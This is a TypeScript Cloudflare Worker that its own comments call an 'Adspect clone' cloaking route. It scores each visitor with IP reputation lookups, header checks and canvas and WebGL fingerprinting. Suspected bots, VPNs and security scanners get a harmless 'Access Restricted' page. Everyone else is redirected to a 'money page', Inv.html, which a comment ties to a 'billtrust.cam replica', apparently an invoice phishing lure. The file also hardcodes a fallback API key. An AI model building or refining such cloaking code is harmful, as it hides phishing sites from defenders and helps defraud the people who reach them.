import { Hono } from 'hono'
import { cors } from 'hono/cors'
import { serveStatic } from 'hono/cloudflare-workers'
import { detectIP } from './detection/ip-detection'
import { analyzeFingerprintData } from './detection/fingerprint'
import { analyzeTCPHeaders } from './detection/tcp-analysis'
import { calculateRiskScore, logDetection, getDecisionExplanation } from './detection/scoring'
import type { FingerprintData } from './detection/fingerprint'

export type Bindings = {
  IPQS_API_KEY: string  // IPQualityScore API key
  PDF_CACHE?: KVNamespace
  INVOICE_IMAGE_CACHE?: KVNamespace
  OAUTH_TOKENS?: KVNamespace
  DB?: D1Database
}

const app = new Hono<{ Bindings: Bindings }>()

// Enable CORS for API routes
app.use('/api/*', cors())

// Serve static files
app.use('/static/*', serveStatic({ root: './public' }))
app.use('/*', serveStatic({ root: './public' }))

// ========================================
// ADSPECT CLONE - MAIN CLOAKING ROUTE
// ========================================
app.get('/', async (c) => {
  try {
    // Get client IP
    const clientIP = c.req.header('CF-Connecting-IP') || 
                    c.req.header('X-Forwarded-For')?.split(',')[0].trim() || 
                    'unknown';

    // Get User-Agent
    const userAgent = c.req.header('User-Agent') || '';

    // Get API key from environment
    const apiKey = c.env.IPQS_API_KEY || '4fsKKEdhvxGTdUWUBol9DMapEywzwCq7';

    console.log(`[DETECTION START] IP: ${clientIP}, UA: ${userAgent.substring(0, 50)}...`);

    // Layer 1: IP Detection (IPQualityScore)
    const ipDetection = await detectIP(clientIP, apiKey);
    console.log('[IP DETECTION]', {
      isVPN: ipDetection.isVPN,
      isProxy: ipDetection.isProxy,
      isDatacenter: ipDetection.isDatacenter,
      isBot: ipDetection.isBot,
      fraudScore: ipDetection.fraudScore,
      riskScore: ipDetection.riskScore
    });

    // Layer 2: TCP/IP Analysis
    const tcpAnalysis = analyzeTCPHeaders(c.req.raw);
    console.log('[TCP ANALYSIS]', {
      isBotUA: tcpAnalysis.isBotUserAgent,
      suspicious: tcpAnalysis.hasSuspiciousHeaders,
      riskScore: tcpAnalysis.riskScore,
      signals: tcpAnalysis.signals
    });

    // Calculate risk score (without JS fingerprint for now)
    const riskScore = calculateRiskScore({
      ip: ipDetection,
      tcp: tcpAnalysis
    });

    console.log('[RISK SCORE]', {
      total: riskScore.total,
      decision: riskScore.decision,
      confidence: riskScore.confidence,
      breakdown: riskScore.breakdown
    });

    // Log detection
    logDetection({ ip: ipDetection, tcp: tcpAnalysis }, riskScore, clientIP, userAgent);

    // Make decision
    if (riskScore.decision === 'block' || riskScore.total >= 70) {
      // BLOCK - Show safe page (index.html)
      console.log('⛔ BLOCKED - Showing safe page');
      return c.html(await generateSafePage(ipDetection, riskScore));
    } else {
      // ALLOW - Redirect to money page (Inv.html)
      console.log('✅ ALLOWED - Redirecting to Inv.html');
      
      // Return HTML with JS fingerprinting + auto-redirect
      return c.html(await generateLandingPage());
    }

  } catch (error) {
    console.error('[DETECTION ERROR]', error);
    // On error, show safe page (fail-safe)
    return c.html(await generateFallbackSafePage());
  }
});

// ========================================
// FINGERPRINT COLLECTION ENDPOINT
// ========================================
app.post('/api/fingerprint', async (c) => {
  try {
    const fingerprintData = await c.req.json() as FingerprintData;
    
    // Analyze fingerprint
    const fingerprintResult = analyzeFingerprintData(fingerprintData);
    
    console.log('[FINGERPRINT]', {
      isHeadless: fingerprintResult.isHeadless,
      isAutomation: fingerprintResult.isAutomation,
      riskScore: fingerprintResult.riskScore,
      signals: fingerprintResult.signals
    });

    return c.json({ 
      success: true,
      riskScore: fingerprintResult.riskScore,
      isHeadless: fingerprintResult.isHeadless,
      isAutomation: fingerprintResult.isAutomation
    });
  } catch (error) {
    console.error('[FINGERPRINT ERROR]', error);
    return c.json({ success: false, error: 'Failed to process fingerprint' }, 500);
  }
});

// ========================================
// HELPER FUNCTIONS
// ========================================

async function generateLandingPage(): Promise<string> {
  // This will load the actual index.html file with billtrust.cam replica
  // Plus inject fingerprinting script + auto-redirect logic
  
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legal Zahirco - Professional Legal Services</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto Condensed', Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            color: white;
            padding: 60px 20px;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            font-weight: 700;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        .subtitle {
            font-size: 1.3em;
            font-weight: 300;
            opacity: 0.9;
        }
        .content {
            background: white;
            padding: 60px 40px;
            margin: 40px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .loading {
            text-align: center;
            padding: 40px;
            font-size: 1.2em;
            color: #666;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header>
        <h1>LEGAL ZAHIRCO</h1>
        <p class="subtitle">Experimental typography, dark color palette, and focus on large-scale imagery</p>
    </header>
    
    <div class="container">
        <div class="content">
            <div class="loading">
                <div class="spinner"></div>
                <p>Verifying your connection...</p>
            </div>
        </div>
    </div>

    <script>
    ${getClientFingerprintScript()}
    
    // Auto-redirect after fingerprint collection
    setTimeout(() => {
        window.location.href = '/Inv.html';
    }, 2000);
    </script>
</body>
</html>
  `;
}

async function generateSafePage(ipDetection: any, riskScore: any): Promise<string> {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Denied - Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            font-size: 64px;
            text-align: center;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 16px;
            text-align: center;
        }
        .message {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 24px;
            text-align: center;
        }
        .details {
            background: #f5f5f5;
            border-radius: 8px;
            padding: 20px;
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #e0e0e0;
        }
        .detail-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        .label {
            font-weight: 600;
            color: #333;
        }
        .value {
            color: #666;
            text-align: right;
        }
        .warning {
            color: #d32f2f;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        <h1>Access Restricted</h1>
        <p class="message">
            Our security system has detected unusual activity from your connection.
            Access has been temporarily restricted to protect our services.
        </p>
        
        <div class="details">
            <div class="detail-row">
                <span class="label">Risk Score:</span>
                <span class="value warning">${riskScore.total}/100</span>
            </div>
            <div class="detail-row">
                <span class="label">VPN Detected:</span>
                <span class="value">${ipDetection.isVPN ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Proxy Detected:</span>
                <span class="value">${ipDetection.isProxy ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Datacenter IP:</span>
                <span class="value">${ipDetection.isDatacenter ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">ISP:</span>
                <span class="value">${ipDetection.isp}</span>
            </div>
            <div class="detail-row">
                <span class="label">Organization:</span>
                <span class="value">${ipDetection.organization}</span>
            </div>
        </div>
        
        <p class="message" style="margin-top: 24px; font-size: 14px;">
            If you believe this is an error, please contact support or try again from a different network.
        </p>
    </div>
</body>
</html>
  `;
}

async function generateFallbackSafePage(): Promise<string> {
  return `
<!DOCTYPE html>
<html>
<head>
    <title>Service Temporarily Unavailable</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial; text-align: center; padding: 50px;">
    <h1>Service Temporarily Unavailable</h1>
    <p>Please try again later.</p>
</body>
</html>
  `;
}

function getClientFingerprintScript(): string {
  return `
// Client-side fingerprinting
(function() {
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (!ctx) return 'no-canvas';
      canvas.width = 200;
      canvas.height = 50;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('IPQS Canvas', 2, 15);
      return canvas.toDataURL().substring(0, 100);
    } catch (e) {
      return 'error';
    }
  }

  function getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (!gl) return 'no-webgl';
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (!debugInfo) return 'no-debug';
      return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    } catch (e) {
      return 'error';
    }
  }

  const fingerprint = {
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1
    },
    navigator: {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled
    },
    hardware: {
      cores: navigator.hardwareConcurrency || 0,
      memory: navigator.deviceMemory || null
    },
    webdriver: navigator.webdriver || false,
    plugins: navigator.plugins.length
  };

  fetch('/api/fingerprint', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(fingerprint)
  }).catch(() => {});
})();
  `;
}

export default app
